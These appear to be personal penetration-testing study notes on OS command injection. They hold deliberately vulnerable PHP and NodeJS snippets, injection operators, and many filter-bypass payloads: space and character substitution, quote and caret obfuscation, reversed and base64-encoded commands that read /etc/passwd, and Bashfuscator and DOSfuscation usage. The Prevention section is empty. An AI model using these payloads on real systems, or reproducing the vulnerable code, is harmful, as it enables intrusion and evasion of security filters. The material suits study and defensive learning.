# Intro
 Injection occurs when user-controlled input is misinterpreted as part of the web query or code being executed, which may lead to subverting the intended outcome of the query to a different outcome that is useful to the attacker.

The user input we control must directly or indirectly go into (or somehow affect) a web query that executes system commands directly on the back-end server.

## PHP Example
PHP may use the `exec`, `system`, `shell_exec`, `passthru`, or `popen to execute commands on the back-end server, each with a different use case.

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```
*Example PHP Code*

The above code is a web app that allows a user to create a PDF on the back-end servers file system in the `/tmp` directory with a filename supplied by the user. Because the `filename` parameter gets passed directly to the `touch` command, this would be vulnerable to a command injection.

## NodeJS Example
In NodeJS, the developer may use the `child_process.exec` or `child_process.spawn` for the same purpose as the PHP example.

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```
*This NodeJS snippet performs a similar function to the PHP above*

The above NodeJS is vulnerable because it again uses the filename parameter with the `touch` command without sanitizing it first.

# Exploitation
## Detection
The Process for detecting OS command injection is the same as the process for exploiting it. We attempt to append our malicious command through various methods.
> Note: We should always try our final command on our local machine to make sure it works

### Example Host Checker App
Below we see a sample host checker app that asks for an IP address to verify whether the host is up or not.
![cmdinj_basic_exercise_1](./images/cmdinj_basic_exercise_1.jpg)

If we enter the loopback IP (127.0.0.1), we can see that it returns the output of the `ping` command.
![cmdinj_basic_exercise_2](./images/cmdinj_basic_exercise_2.jpg)

Without access to the source code, we can assume that the app is taking our input (the IP) and passing it directly to a system level ping command. That ping command probably looks something like this:
```bash
ping -c 1 OUR_INPUT
```
If the input is not sanitized and escaped before it used with the ping command, we may be able to inject a malicious command.

### Command Injection Methods
|Injection Operator|Injection Character|URL-Encoded Character|Executed Command|
|------------------|-------------------|---------------------|----------------|
|Semicolon|`;`|`%3b`|Both|
|New Line|`\n`|`%0a`|Both|
|Background|`&`|`%26`|Both (second output generally shown first)|
|Pipe|`\|`|`%7c`|Both (only second output is shown)|
|AND|`&&`|`%26%26`|Both (only if first succeeds)|
|OR|`\|\|`|`%7c%7c`|Second (only if first fails)|
|Sub-Shell|``` `` ```|`%60%60`|Both (Linux-only)|
|Sub-Shell|`$()`|`%24%28%29`|Both (Linux-only)|

*Table of Command Injection Methods*
> Note: Any of the above CI Methods should work on any web framework, with the exection of the semicolon `;`. The semicolon will not work in windows command line, but will work in powershell.

To perform the injection, we would write out the expected input (in this case an IP), add one of our methods, and then add thee command we would like to run.
Example: 127.0.0.1\n whoami

## Injecting Commands
If our attempt to inject a command fails, we need to determine where the input sanitization is happening. The easiest way to do this is through Developer tools.

We can open firefox developer tools with `CTRL-SHIFT-E` and observe the network tab to see if our request is even sent or if the front-end blocked it. If no request is sent (nothing appears in the network tab) then the front-end is doing the input sanitazation. 

### Bypassing Front-End Validation
The easiest way to bypass the front end is to send the request manually using a proxy like burp.
- First we capture a standard request. In this case, just an IP
- Then we tack our payload on to the end of the of the parameter we're trying to inject on.
    >Note: We may need to URL-Encode any spaces or special characters  

Another way may be to review the source code. In our IP address example, we can look at the source code and see what characters are allowed and what pattern they follow. 
```html
<body>
  <div class="main">
    <h1>Host Checker</h1>

    <form method="post" action="">
      <label>Enter an IP Address</label>
      <input type="text" name="ip" placeholder="127.0.0.1" pattern="^((\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.){3}(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$">
      <button type="submit">Check</button>
    </form>
```
*Sample input validation*

In the above, we can see the `pattern` that is allowed in this particular web app.

## Other Injection Operators
### AND (&&) Operator
The AND operator requires that both commands are successful. 
Eample: If we try and just use the AND operator without an IP (Payload = `ip=%26%26+whoami`), then both will fail because the `ping` command will exit code 1, meaning it errored out, and our additional command will not process.

### OR (||) Operator
The OR operator only executes if our first command fails to execute.
Example: If we use the same example as above, and just swap the `&&` for `||`, we'll see the command succeed, because the first command (ping) errored out, and the second command can run. However, if the first command had not errored out and exited code 0, our command would not have run, because the first command completed successfully.

# Filter Evasion
## Identifying filters
### Filter/WAF Detection
- If an error message is displayed on a different page (a redirect), with information like ouir IP and our request, we were probably denied by WAF.

### Blacklisted Characters
```PHP
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```
*Example PHP code for with blacklisted characters*

Referencing the above code, if our string contains any of the characters in `$blacklist`, we'll be denied.

- The easiest way to evaluate the blacklist (if we can't see the code), is to append each character to a valid input and see what get's blocked and what doesn't.

## Bypassing Space Filters
### Bypass Blacklisted Spaces
- Spaces are a commonly blacklisted character
- Use Tabs (`%09`)
- Use $IFS (Linux Only)
    - `ip=127.0.0.1%0a${IFS}`
    - Linux only
- Use Brace Expansion (Bash Only)
    - `{ls,-la}`
> Note: More bypass at [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)

## Bypassing Other Blacklisted Characters
We can use environment variables to pick a special character contained in that variable to insert in to our command injections.

### Enumeration
Blacklisted characters can be enumerated by just adding a character to the legit payload and seeing if it is blocked
```html
payload=127.0.0.1&
```
*Example with just the `&` added to our ping payload.*

### Linux
We can use environment variables to bypass Filters much like we did with `${IFS}`

- Using `$PATH` (or any other variable)
```bash
echo ${PATH}

/usr/local/bin:/usr/bin:/bin:/usr/games
```
If we start at 0, and take a string length of 1, we can isolate the `\` and use it in our commmand.
```bash
echo ${PATH:0:1}

/
```
> Note: Don't use `echo` in your command, we are just using that for demonstration purposes  

We can do the same thing with `$HOME` or `$PWD` environment variables as well. We can use the `printenv` variable to find which characters are in which variables that we can use.

### Windows
The same concept can be used in windows. We can use the echo command, combined with a starting position and a negative ending position.
```cmd
C:\Users\chvxt3r>echo %HOMEPATH%
\Users\chvxt3r

C:\Users\chvxt3r>echo %HOMEPATH:~6,-7%
\
```
*Example to demonstrate getting a `/` out of the path variable.*
> Note: echoing windows variables requires a `%` on either end.

We can use `Get-ChildItem Env:` Powershell command to print all environment variables to pick and choose the variable and character we need.

### Character shifting
We can use character shifting to insert a character that may be filtered. In the example below the `[` is 1 ascii character up from `\`. Therefore, we can shift that character down to the `\`.
```bash
man ascii     # \ is on 92, before it is [ on 91
echo $(tr '!-}' '"-~'<<<[)
```

## Bypassing Blacklisted Commands
### Enumeration
If we've found a character that we know is not blocked using the above methods, it's possible that the command itself is blocked.
```PHP
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```
*Example PHP command blacklist (stored in the `$blacklist` variable)*

### Linux & Windows
One very common and easy obfuscation technique is to insert characters into the command that are normally ignored by Bash or Powershell, such as single quote `'` or a double-quote `"`.
```bash
w'h'o'am'i
```
*Example Obfuscation using a single quote of the `whoami` command*
> Note: We cannot mix and max obfuscators. If you use single quotes, you can only use single quotes. The quotes must also be an even number.

### Linux
We can use a few other linux only characters for obfuscation of our command, including the `\` and the positional `$@`. These works exactly as they did with the quotes, without the even requirement.
```bash
who$@ami
```
*Example obfuscation of `whoami` using the `$@` operator.*
```bash
w\ho\am\i
```
*Example obfuscation of `whoami` using the `\`*

### Windows
Some windows-only characters we can insert into a command without affecting the outcome are the caret (`^`)
```cmd
who^ami
```
*Example obfuscation of `whoami` using a caret

## Advanced Command Obfuscation
### Case Manipulation
We can try inverting or alternating the case of the command on case insensitive systems (such as windows). This workes because the filter may not check the case of the command.
```cmd
WhOaMi
```

When it comes to case sensitive systems (such as linux), we may have to get a bit more advanced and craft a command that changes the case on the fly.
```bash
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
*Example payload to change the case on the fly using `tr`*
> Note: The above `tr` command contains spaces, which may also be blocked. Be sure to replace them in your final command.

### Reversed Commands
We can try reversing a command then reversing it back in a subshell.
```bash
echo 'whoami' | rev
imaohw
```
*Example of creating our reversed command*

```bash
$(rev<<<'imaohw')
```
*Example payload that reverses `imaohw` into 'whoami' in a subshell*
> Note: If you need to include a character filter in your payload, you need to include it when you reverse the command.

We can do this in windows as well
```powershell
"whoami"[-1..-20] -join ''
imaohw
```
*Example reversing of the `whoami` command in powershell.*

```powershell
iex "$('imaohw'[-1..-20] -join ""_)"
```
*Example payload that reverses `imaohw` into `whoami` in IEX

### Encoded Commands
We can use encoded commands if we know the commands will be decoded by the server. This may be unreliable as the command may be messed up by the time it gets to the command interpeter.
```bash
echo -n 'cat /etc/password | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```
*Example of base64 encoding the command `cat /etc/password | grep 33`*

Payload
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```
> Note: We used the `<<<` to avoid using the pipe (`|`), which is commonly filtered.

Even if some of the commands are filtered, such as `bash` or `base64`, we can combine our command with some of the techniques above to get it through the filter. We can also use alternatives like `sh` for command execution or `openssl` for base64 decoding or `xxd` for hex decoding.

Same Technique in Windows.
```ps
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```
*Encoding the `whoami` in base64*

If we are trying to do this to a windows machine from a linux attack machine, we need to convert the string from `utf-8` to `utf-16` before we base64 it. Example below.
```bash
echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```

## Evasion Tools
### Linux ([Bashfuscator](https://github.com/Bashfuscator/Bashfuscator))
- Installation
```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```
- Usage
After install, the command can be run out of `./bashfuscator/bin` directory.
```bash
Chvxt3r@hackbox[/workspace/tools]$ cd ./bashfuscator/bin/
Chvxt3r@hackbox[/workspace/tools]$ ./bashfuscator -h

usage: bashfuscator [-h] [-l] 

optional arguments:
  -h, --help            show this help message and exit

Program Options:
  -l, --list            List all the available obfuscators, compressors, and encoders
  -c COMMAND, --command COMMAND
                        Command to obfuscate
```
*bashfuscator -h*

We can start using it by just providing the `-c` flag and a command
```bash
Chvxt3r@hackbox[/workspace/tools]$ ./bashfuscator -c 'cat /etc/passwd'

[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters
```
*Generating a payload*
> Note: This runs the tool with random obfuscators, and may produce an exceedingly long payload.

We can use some of the flags to generate a smaller payload.
```bash
Chvxt3r@hackbox[/workspace/tools]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

- Testing the payload
```bash
Chvxt3r@hackbox[/workspace/tools]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
```

### Windows ([DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation))
Unlike Bashfuscator, this is an interactive tool

- Installation
```ps
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```
*DOSfuscation installation*

- Usage
```ps
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```
*DOSfuscation usage*

- Verification
```cmd
C:\chvxt3r> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```
> Note: This can be run through `pwsh` if you don't have access to a windows VM.


# Prevention

# Todo
- [ ] Pickup at Filter Evasion
